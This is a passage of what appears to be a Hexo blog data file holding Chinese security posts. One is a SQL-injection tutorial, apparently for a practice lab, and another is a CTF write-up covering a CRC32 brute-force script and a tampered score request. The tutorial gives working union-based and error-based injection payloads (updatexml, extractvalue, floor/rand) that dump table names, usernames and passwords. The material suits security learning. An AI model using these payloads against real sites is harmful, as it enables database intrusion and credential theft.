class=\"line\">+----+----------+------------+</span><br></pre></td></tr></table></figure>\n\n<p><code>?id=%27 order by 3 %23</code></p>\n<p><code>?id=%27 order by 4 %23</code></p>\n<p><img src=\"/pic/28.png\" alt=\"\"></p>\n<p><img src=\"/pic/29.png\" alt=\"\"></p>\n<p>4报错，3没有报错，表示此表有三列。</p>\n<p><em>sql 控制台的执行结果</em></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from users where id&#x3D;0 order by 4;</span><br><span class=\"line\">ERROR 1054 (42S22): Unknown column &#39;4&#39; in &#39;order clause&#39;</span><br><span class=\"line\">mysql&gt; select * from user where id&#x3D;0 order by 3;</span><br><span class=\"line\">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>\n\n<p>查看回显位置</p>\n<p><code>?id=%27 union select 1,2,3 %23</code></p>\n<p><img src=\"/pic/30.png\" alt=\"\">  2，3处有回显。</p>\n<p><em>sql控制台执行结果</em></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from user where id&#x3D;0 union select 1,2,3;</span><br><span class=\"line\">+------+----------+----------+</span><br><span class=\"line\">| id   | username | password |</span><br><span class=\"line\">+------+----------+----------+</span><br><span class=\"line\">|    1 | 2        | 3        |</span><br><span class=\"line\">+------+----------+----------+</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n\n<p>因为sql控制台是所有都显示的，网页的界面的前端代码设置回显。</p>\n</li>\n<li><p>获取数据库名</p>\n<p><code>?id=%27 union select 1,database() ,3 %23</code></p>\n<p><img src=\"/pic/31.png\" alt=\"\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from users where id&#x3D;0 union select 1,database(),3;</span><br><span class=\"line\">+----+----------+----------+</span><br><span class=\"line\">| id | username | password |</span><br><span class=\"line\">+----+----------+----------+</span><br><span class=\"line\">|  1 | security | 3        |</span><br><span class=\"line\">+----+----------+----------+</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>获取表名</p>\n<p>在mysql的数据库中包含一个数据库，information_schema，其中的tables表中记录所有数据库的表名,table_schema栏记录是所属的数据库，table_name记录数据库包含的表名</p>\n<p><img src=\"/32.png\" alt=\"\"></p>\n<p><code>?id=%27 union select 1,group_concat(table_name) ,3  from information_schema.tables where table_schema=&#39;security&#39; %23</code></p>\n<p><img src=\"/33.png\" alt=\"\"></p>\n</li>\n<li><p>获取列名</p>\n<p>在information_schema中，columns表中记录所有数据库所有表的列名,table_schema栏记录是所属的数据库，table_name记录数据库包含的表名，column_name,记录的是列名</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from columns where table_name&#x3D;&#39;users&#39; and table_schema&#x3D;&#39;security&#39;</span><br><span class=\"line\">    -&gt; ;</span><br><span class=\"line\">+---------------+--------------+------------+-------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-------------------+-------------+------------+----------------+---------------------------------+----------------+-----------------------+</span><br><span class=\"line\">| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | ORDINAL_POSITION | COLUMN_DEFAULT | IS_NULLABLE | DATA_TYPE | CHARACTER_MAXIMUM_LENGTH | CHARACTER_OCTET_LENGTH | NUMERIC_PRECISION | NUMERIC_SCALE | DATETIME_PRECISION | CHARACTER_SET_NAME | COLLATION_NAME    | COLUMN_TYPE | COLUMN_KEY | EXTRA          | PRIVILEGES                      | COLUMN_COMMENT | GENERATION_EXPRESSION |</span><br><span class=\"line\">+---------------+--------------+------------+-------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-------------------+-------------+------------+----------------+---------------------------------+----------------+-----------------------+</span><br><span class=\"line\">| def           | security     | users      | id          |                1 | NULL           | NO          | int       |                     NULL |                   NULL |                10 |             0 |               NULL | NULL               | NULL              | int(3)      | PRI        | auto_increment | select,insert,update,references |                |                       |</span><br><span class=\"line\">| def           | security     | users      | username    |                2 | NULL           | NO          | varchar   |                       20 |                     20 |              NULL |          NULL |               NULL | latin1             | latin1_swedish_ci | varchar(20) |            |                | select,insert,update,references |                |                       |</span><br><span class=\"line\">| def           | security     | users      | password    |                3 | NULL           | NO          | varchar   |                       20 |                     20 |              NULL |          NULL |               NULL | latin1             | latin1_swedish_ci | varchar(20) |            |                | select,insert,update,references |                |                       |</span><br><span class=\"line\">+---------------+--------------+------------+-------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-------------------+-------------+------------+----------------+---------------------------------+----------------+-----------------------+</span><br><span class=\"line\">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n\n<p><code>?id=%27 union select 1,group_concat(table_name) ,3  from information_schema.tables where table_schema=&#39;security&#39; %23</code></p>\n<p><img src=\"/34.png\" alt=\"\"></p>\n</li>\n<li><p>获取内容</p>\n<p>获取users表的username和password</p>\n<p><code>?id=%27 union select 1,group_concat(username) ,group_concat(password)  from users %23</code></p>\n<p><img src=\"/35.png\" alt=\"\"></p>\n</li>\n</ol>\n<h3 id=\"b-报错注入\"><a href=\"#b-报错注入\" class=\"headerlink\" title=\"b. 报错注入\"></a>b. 报错注入</h3><ol>\n<li><p>查询数据库</p>\n<p><code>?id=0&#39; and updatexml(1,concat(1,(select database())),1)%23</code></p>\n<p>或者<code>?id=0&#39; and extractvalue(1,concat(1,(select database())))%23</code></p>\n<p><code>?id=0&#39; and (select 1 from (select count(*),concat((select database()),floor (rand(0)*2))x from information_schema.tables group by x)a)--+</code>(在测试时，这一条buu上无回显，但是本地是可以的，<strong>此条语句最多能显示64个字符，上面两条最多32个</strong>)</p>\n<p><img src=\"/36.png\" alt=\"\"></p>\n</li>\n<li><p>查询表名 <em>与基本注入相同不在重复</em></p>\n</li>\n<li><p>查询列名 <em>与基本注入相同不在重复</em></p>\n</li>\n<li><p>查信息</p>\n<p><code>?id=0&#39; and extractvalue(1,concat(1,(select substr(concat(username,&#39;~&#39;,password),1,30) from users limit 2,1 )))%23</code></p>\n<p>或者</p>\n<p><code>?id=0&#39; and updatexml(1,concat(1,(select substr(concat(username,&#39;~&#39;,password),1,30) from users limit 2,1 )),1)%23</code></p>\n<p>或者</p>\n<p><code>?id=0&#39; and (select 0 from (select count(*),concat((select concat(username,&#39;~&#39;,password) from users limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a)--+</code></p>\n<p>通过修改limit 一条一条查询</p>\n</li>\n</ol>\n<h3 id=\"c-输出文件注入\"><a href=\"#c-输出文件注入\" class=\"headerlink\" title=\"c. 输出文件注入\"></a>c. 输出文件注入</h3>","site":{"data":{}},"excerpt":"<h2 id=\"0x00-介绍\"><a href=\"#0x00-介绍\" class=\"headerlink\" title=\"0x00 介绍\"></a>0x00 介绍</h2><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>","more":"<h2 id=\"0x01-某些函数的使用方法\"><a href=\"#0x01-某些函数的使用方法\" class=\"headerlink\" title=\"0x01 某些函数的使用方法\"></a>0x01 某些函数的使用方法</h2><ol>\n<li><p>concat(str1,str2,str3,…),将多个字符串连接成一个字符串。</p>\n</li>\n<li><p>concat_ws(分隔符, str1, str2, …),添加了分割符（concat_ws就是concat with separator）</p>\n</li>\n<li><p>group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc  ] [separator ‘分隔符’] )，将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</p>\n</li>\n</ol>\n<p><a href=\"https://blog.csdn.net/Mary19920410/article/details/76545053\" target=\"_blank\" rel=\"noopener\">参考文章</a></p>\n<ol start=\"4\">\n<li><p>if(表达式1，表达式2，表达式3)，如果表达式1的值为真，执行表达式2，否则执行表达式3</p>\n</li>\n<li><p>substr(str,pos,len)/  mid(str,pos,len),从pos处开始截取，截取长度为len的字符 </p>\n<ul>\n<li>MySQL: SUBSTR( ), SUBSTRING( )</li>\n<li>Oracle: SUBSTR( )</li>\n<li>SQL Server: SUBSTRING( ) </li>\n</ul>\n</li>\n<li><p>char()<strong>将十进制数转换成字符</strong>，在过滤掉单双引号的时使用较多；与其相反的是ascii()函数</p>\n</li>\n<li><p>sleep(n)，暂停数据库n秒，benchmarlk(count，表达式)，将表达式执行count次可以达到延迟效果</p>\n</li>\n<li><p>Length() 返回字符串的长度</p>\n</li>\n<li><p>database() 返回当前数据库名称</p>\n</li>\n<li><p>count(*) ,计数</p>\n</li>\n<li><p>floor(value)函数返回小于或等于指定值（value）的最小整数</p>\n</li>\n<li><p>ceiling(value)函数返回大于或等于指定值（value）的最小整数</p>\n</li>\n<li><p>rand()产生随机数介于0和1之间的一个数,rand(0)，则返回值都为<code>0.15522042769493574</code></p>\n</li>\n<li><p>查询xml函数<strong>extractvalue(目标xml文档，xml路径)</strong>与更新xml函数<strong>updatexml(目标xml文档，xml路径，更新的内容)</strong>  最大只能出32字符</p>\n</li>\n<li><p>reverse(str)翻转字符串</p>\n</li>\n<li><p>limit pos,len，   从pos开始查询，查询len条数据    </p>\n</li>\n<li><p>set 可以设置变量</p>\n</li>\n<li><p>prepare 预处理</p>\n</li>\n<li></li>\n</ol>\n<h2 id=\"0x02-操作过程与分析\"><a href=\"#0x02-操作过程与分析\" class=\"headerlink\" title=\"0x02 操作过程与分析\"></a>0x02 操作过程与分析</h2><h3 id=\"a-基本注入\"><a href=\"#a-基本注入\" class=\"headerlink\" title=\"a. 基本注入\"></a>a. 基本注入</h3><ol>\n<li><p>使用order/group by 判断字段长度</p>\n<p>users表中内容</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">mysql&gt;</span><span class=\"bash\"> select * from users</span></span><br><span class=\"line\">    -&gt; ;</span><br><span class=\"line\">+----+----------+------------+</span><br><span class=\"line\">| id | username | password   |</span><br><span class=\"line\">+----+----------+------------+</span><br><span class=\"line\">|  1 | Dumb     | Dumb       |</span><br><span class=\"line\">|  2 | Angelina | I-kill-you |</span><br><span class=\"line\">|  3 | Dummy    | p@ssword   |</span><br><span class=\"line\">|  4 | secure   | crappy     |</span><br><span class=\"line\">|  5 | stupid   | stupidity  |</span><br><span class=\"line\">|  6 | superman | genious    |</span><br><span class=\"line\">|  7 | batman   | mob!le     |</span><br><span class=\"line\">|  8 | admin    | admin      |</span><br><span class=\"line\">+----+----------+------------+</span><br></pre></td></tr></table></figure>\n\n<p><code>?id=%27 order by 3 %23</code></p>\n<p><code>?id=%27 order by 4 %23</code></p>\n<p><img src=\"/pic/28.png\" alt=\"\"></p>\n<p><img src=\"/pic/29.png\" alt=\"\"></p>\n<p>4报错，3没有报错，表示此表有三列。</p>\n<p><em>sql 控制台的执行结果</em></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from users where id&#x3D;0 order by 4;</span><br><span class=\"line\">ERROR 1054 (42S22): Unknown column &#39;4&#39; in &#39;order clause&#39;</span><br><span class=\"line\">mysql&gt; select * from user where id&#x3D;0 order by 3;</span><br><span class=\"line\">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>\n\n<p>查看回显位置</p>\n<p><code>?id=%27 union select 1,2,3 %23</code></p>\n<p><img src=\"/pic/30.png\" alt=\"\">  2，3处有回显。</p>\n<p><em>sql控制台执行结果</em></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from user where id&#x3D;0 union select 1,2,3;</span><br><span class=\"line\">+------+----------+----------+</span><br><span class=\"line\">| id   | username | password |</span><br><span class=\"line\">+------+----------+----------+</span><br><span class=\"line\">|    1 | 2        | 3        |</span><br><span class=\"line\">+------+----------+----------+</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n\n<p>因为sql控制台是所有都显示的，网页的界面的前端代码设置回显。</p>\n</li>\n<li><p>获取数据库名</p>\n<p><code>?id=%27 union select 1,database() ,3 %23</code></p>\n<p><img src=\"/pic/31.png\" alt=\"\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from users where id&#x3D;0 union select 1,database(),3;</span><br><span class=\"line\">+----+----------+----------+</span><br><span class=\"line\">| id | username | password |</span><br><span class=\"line\">+----+----------+----------+</span><br><span class=\"line\">|  1 | security | 3        |</span><br><span class=\"line\">+----+----------+----------+</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>获取表名</p>\n<p>在mysql的数据库中包含一个数据库，information_schema，其中的tables表中记录所有数据库的表名,table_schema栏记录是所属的数据库，table_name记录数据库包含的表名</p>\n<p><img src=\"/32.png\" alt=\"\"></p>\n<p><code>?id=%27 union select 1,group_concat(table_name) ,3  from information_schema.tables where table_schema=&#39;security&#39; %23</code></p>\n<p><img src=\"/33.png\" alt=\"\"></p>\n</li>\n<li><p>获取列名</p>\n<p>在information_schema中，columns表中记录所有数据库所有表的列名,table_schema栏记录是所属的数据库，table_name记录数据库包含的表名，column_name,记录的是列名</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from columns where table_name&#x3D;&#39;users&#39; and table_schema&#x3D;&#39;security&#39;</span><br><span class=\"line\">    -&gt; ;</span><br><span class=\"line\">+---------------+--------------+------------+-------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-------------------+-------------+------------+----------------+---------------------------------+----------------+-----------------------+</span><br><span class=\"line\">| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | ORDINAL_POSITION | COLUMN_DEFAULT | IS_NULLABLE | DATA_TYPE | CHARACTER_MAXIMUM_LENGTH | CHARACTER_OCTET_LENGTH | NUMERIC_PRECISION | NUMERIC_SCALE | DATETIME_PRECISION | CHARACTER_SET_NAME | COLLATION_NAME    | COLUMN_TYPE | COLUMN_KEY | EXTRA          | PRIVILEGES                      | COLUMN_COMMENT | GENERATION_EXPRESSION |</span><br><span class=\"line\">+---------------+--------------+------------+-------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-------------------+-------------+------------+----------------+---------------------------------+----------------+-----------------------+</span><br><span class=\"line\">| def           | security     | users      | id          |                1 | NULL           | NO          | int       |                     NULL |                   NULL |                10 |             0 |               NULL | NULL               | NULL              | int(3)      | PRI        | auto_increment | select,insert,update,references |                |                       |</span><br><span class=\"line\">| def           | security     | users      | username    |                2 | NULL           | NO          | varchar   |                       20 |                     20 |              NULL |          NULL |               NULL | latin1             | latin1_swedish_ci | varchar(20) |            |                | select,insert,update,references |                |                       |</span><br><span class=\"line\">| def           | security     | users      | password    |                3 | NULL           | NO          | varchar   |                       20 |                     20 |              NULL |          NULL |               NULL | latin1             | latin1_swedish_ci | varchar(20) |            |                | select,insert,update,references |                |                       |</span><br><span class=\"line\">+---------------+--------------+------------+-------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-------------------+-------------+------------+----------------+---------------------------------+----------------+-----------------------+</span><br><span class=\"line\">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n\n<p><code>?id=%27 union select 1,group_concat(table_name) ,3  from information_schema.tables where table_schema=&#39;security&#39; %23</code></p>\n<p><img src=\"/34.png\" alt=\"\"></p>\n</li>\n<li><p>获取内容</p>\n<p>获取users表的username和password</p>\n<p><code>?id=%27 union select 1,group_concat(username) ,group_concat(password)  from users %23</code></p>\n<p><img src=\"/35.png\" alt=\"\"></p>\n</li>\n</ol>\n<h3 id=\"b-报错注入\"><a href=\"#b-报错注入\" class=\"headerlink\" title=\"b. 报错注入\"></a>b. 报错注入</h3><ol>\n<li><p>查询数据库</p>\n<p><code>?id=0&#39; and updatexml(1,concat(1,(select database())),1)%23</code></p>\n<p>或者<code>?id=0&#39; and extractvalue(1,concat(1,(select database())))%23</code></p>\n<p><code>?id=0&#39; and (select 1 from (select count(*),concat((select database()),floor (rand(0)*2))x from information_schema.tables group by x)a)--+</code>(在测试时，这一条buu上无回显，但是本地是可以的，<strong>此条语句最多能显示64个字符，上面两条最多32个</strong>)</p>\n<p><img src=\"/36.png\" alt=\"\"></p>\n</li>\n<li><p>查询表名 <em>与基本注入相同不在重复</em></p>\n</li>\n<li><p>查询列名 <em>与基本注入相同不在重复</em></p>\n</li>\n<li><p>查信息</p>\n<p><code>?id=0&#39; and extractvalue(1,concat(1,(select substr(concat(username,&#39;~&#39;,password),1,30) from users limit 2,1 )))%23</code></p>\n<p>或者</p>\n<p><code>?id=0&#39; and updatexml(1,concat(1,(select substr(concat(username,&#39;~&#39;,password),1,30) from users limit 2,1 )),1)%23</code></p>\n<p>或者</p>\n<p><code>?id=0&#39; and (select 0 from (select count(*),concat((select concat(username,&#39;~&#39;,password) from users limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a)--+</code></p>\n<p>通过修改limit 一条一条查询</p>\n</li>\n</ol>\n<h3 id=\"c-输出文件注入\"><a href=\"#c-输出文件注入\" class=\"headerlink\" title=\"c. 输出文件注入\"></a>c. 输出文件注入</h3>"},{"title":"元旦安恒月赛","date":"2020-01-02T06:29:54.000Z","_content":"\n## 安恒元旦月赛\n\n自己就看了这两个题目，其他都是队友解的。\n\n<!--more-->\n\n### MISC\n\n#### 爆破鬼才\n\n首先爆破第一个密码（队友已经爆破出来了）abc123\n\n解压后还是一个压缩包\n\n![](/pic/6.png)\n\n发现`1.txt、2.txt、3.txt`长度不长，应该是要进行CRC32碰撞，附上渣渣脚本\n\n```python\n#coding:utf-8\nimport zipfile\nimport string\nimport binascii\n\ndic=string.printable\ncrc = 0x7d90ee19   \nfor i in dic :\n    for j in dic:\n        for p in dic:\n            for q in dic:\n                s=str(i)+str(j)+str(p)+str(q)\n                if crc == (binascii.crc32(s) & 0xffffffff):\n                    print  s\n```\n\n这个是计算1.txt的，计算另外两个只要把crc改一下，删除连个for循环就好\n\n最后得到的结果是`Blowitup`，打开压缩包，hint.txt中的内容是`guess out my birthday! `，各种百度找它的生日，找到后提交发现都是错误的。最后提示是答案不是生日，队友提示可能是[`outguess`](https://github.com/crorvick/outguess)加密。开始猜测密码，试了好几个都不是。开始写shell脚本（之前没有学），先跑了一遍2012年的没有正确的，改写脚本时，队友已经跑了出来。队友直接用`os.system`跑，从而避免重新学shell脚本。结论：队友太厉害，我太菜。\n\n最后跑出来的密码是20140224。拿着key解密\n\n得到`flag:flag{8322e7eed667c69f27ecbea5f96d86ca}`\n\n### web\n\n#### web1\n\n是一个小游戏，话不多说开始玩一把。\n\n![](/pic/7.png)\n\n玩了一把后查看源码，发现有一个js。\n\n```html\n<!DOCTYPE html>\n<html >\n<head>\n<meta charset=\"UTF-8\">\n<title>JS Planet defense game</title>\n<link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css\">\n<link rel=\"stylesheet\" href=\"css/style.css\">\n</head>\n\n<body>\n<body>\n<canvas id=\"canvas\"></canvas>\n\n</body>\n<script src=\"js/index.js\"></script>\n\n</body>\n</html>\n\n```\n\n点进去拉到最后有几条提示\n\n![](/pic/8.png)\n\n生成一个http请求，将分数发到服务器，将结果显示。\n\n既然要生成请求，直接上`burp suite`，会发送一个record\n\n```\nPOST /f1ag.php HTTP/1.1\nHost: 183.129.189.60:10001\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\nAccept: */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-type: application/x-www-form-urlencoded\nContent-Length: 9\nOrigin: http://183.129.189.60:10001\nConnection: close\nReferer: http://183.129.189.60:10001/\n\nrecord=23\n```\n\n将`record`改成`99999999999999999999999999999999999999999999999999`，即可拿到flag","source":"_posts/元旦安恒月赛.md","raw":"---\ntitle: 元旦安恒月赛\ndate: 2020-01-02 14:29:54\ntags:\n - 安恒月赛2020\n - ctf\n - wp\ncategories: \n - 刷题记录\n---\n\n## 安恒元旦月赛\n\n自己就看了这两个题目，其他都是队友解的。\n\n<!--more-->\n\n### MISC\n\n#### 爆破鬼才\n\n首先爆破第一个密码（队友已经爆破出来了）abc123\n\n解压后还是一个压缩包\n\n![](/pic/6.png)\n\n发现`1.txt、2.txt、3.txt`长度不长，应该是要进行CRC32碰撞，附上渣渣脚本\n\n```python\n#coding:utf-8\nimport zipfile\nimport string\nimport binascii\n\ndic=string.printable\ncrc = 0x7d90ee19   \nfor i in dic :\n    for j in dic:\n        for p in dic:\n            for q in dic:\n                s=str(i)+str(j)+str(p)+str(q)\n                if crc == (binascii.crc32(s) & 0xffffffff):\n                    print  s\n```\n\n这个是计算1.txt的，计算另外两个只要把crc改一下，删除连个for循环就好\n\n最后得到的结果是`Blowitup`，打开压缩包，hint.txt中的内容是`guess out my birthday! `，各种百度找它的生日，找到后提交发现都是错误的。最后提示是答案不是生日，队友提示可能是[`outguess`](https://github.com/crorvick/outguess)加密。开始猜测密码，试了好几个都不是。开始写shell脚本（之前没有学），先跑了一遍2012年的没有正确的，改写脚本时，队友已经跑了出来。队友直接用`os.system`跑，从而避免重新学shell脚本。结论：队友太厉害，我太菜。\n\n最后跑出来的密码是20140224。拿着key解密\n\n得到`flag:flag{8322e7eed667c69f27ecbea5f96d86ca}`\n\n### web\n\n#### web1\n\n是一个小游戏，话不多说开始玩一把。\n\n![](/pic/7.png)\n\n玩了一把后查看源码，发现有一个js。\n\n```html\n<!DOCTYPE html>\n<html >\n<head>\n<meta charset=\"UTF-8\">\n<title>JS Planet defense game</title>\n<link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css\">\n<link rel=\"stylesheet\" href=\"css/style.css\">\n</head>\n\n<body>\n<body>\n<canvas id=\"canvas\"></canvas>\n\n</body>\n<script src=\"js/index.js\"></script>\n\n</body>\n</html>\n\n```\n\n点进去拉到最后有几条提示\n\n![](/pic/8.png)\n\n生成一个http请求，将分数发到服务器，将结果显示。\n\n既然要生成请求，直接上`burp suite`，会发送一个record\n\n```\nPOST /f1ag.php HTTP/1.1\nHost: 183.129.189.60:10001\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\nAccept: */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-type: application/x-www-form-urlencoded\nContent-Length: 9\nOrigin: http://183.129.189.60:10001\nConnection: close\nReferer: http://183.129.189.60:10001/\n\nrecord=23\n```\n\n将`record`改成`99999999999999999999999999999999999999999999999999`，即可拿到flag","slug":"元旦安恒月赛","published":1,"updated":"2020-01-02T06:29:54.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck7vssfma001epk7e3fxl77yf","content":"<h2 id=\"安恒元旦月赛\"><a href=\"#安恒元旦月赛\" class=\"headerlink\" title=\"安恒元旦月赛\"></a>安恒元旦月赛</h2><p>自己就看了这两个题目，其他都是队友解的。</p>\n<a id=\"more\"></a>\n\n<h3 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h3><h4 id=\"爆破鬼才\"><a href=\"#爆破鬼才\" class=\"headerlink\" title=\"爆破鬼才\"></a>爆破鬼才</h4><p>首先爆破第一个密码（队友已经爆破出来了）abc123</p>\n<p>解压后还是一个压缩包</p>\n<p><img src=\"/pic/6.png\" alt=\"\"></p>\n<p>发现<code>1.txt、2.txt、3.txt</code>长度不长，应该是要进行CRC32碰撞，附上渣渣脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#coding:utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> zipfile</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"></span><br><span class=\"line\">dic=string.printable</span><br><span class=\"line\">crc = <span class=\"number\">0x7d90ee19</span>   </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> dic :</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> p <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> q <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">                s=str(i)+str(j)+str(p)+str(q)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> crc == (binascii.crc32(s) &amp; <span class=\"number\">0xffffffff</span>):</span><br><span class=\"line\">                    <span class=\"keyword\">print</span>  s</span><br></pre></td></tr></table></figure>\n\n<p>这个是计算1.txt的，计算另外两个只要把crc改一下，删除连个for循环就好</p>\n<p>最后得到的结果是<code>Blowitup</code>，打开压缩包，hint.txt中的内容是<code>guess out my birthday!</code>，各种百度找它的生日，找到后提交发现都是错误的。最后提示是答案不是生日，队友提示可能是<a href=\"https://github.com/crorvick/outguess\" target=\"_blank\" rel=\"noopener\"><code>outguess</code></a>加密。开始猜测密码，试了好几个都不是。开始写shell脚本（之前没有学），先跑了一遍2012年的没有正确的，改写脚本时，队友已经跑了出来。队友直接用<code>os.system</code>跑，从而避免重新学shell脚本。结论：队友太厉害，我太菜。</p>\n<p>最后跑出来的密码是20140224。拿着key解密</p>\n<p>得到<code>flag:flag{8322e7eed667c69f27ecbea5f96d86ca}</code></p>\n<h3 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h3><h4 id=\"web1\"><a href=\"#web1\" class=\"headerlink\" title=\"web1\"></a>web1</h4><p>是一个小游戏，话不多说开始玩一把。</p>\n<p><img src=\"/pic/7.png\" alt=\"\"></p>\n<p>玩了一把后查看源码，发现有一个js。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span 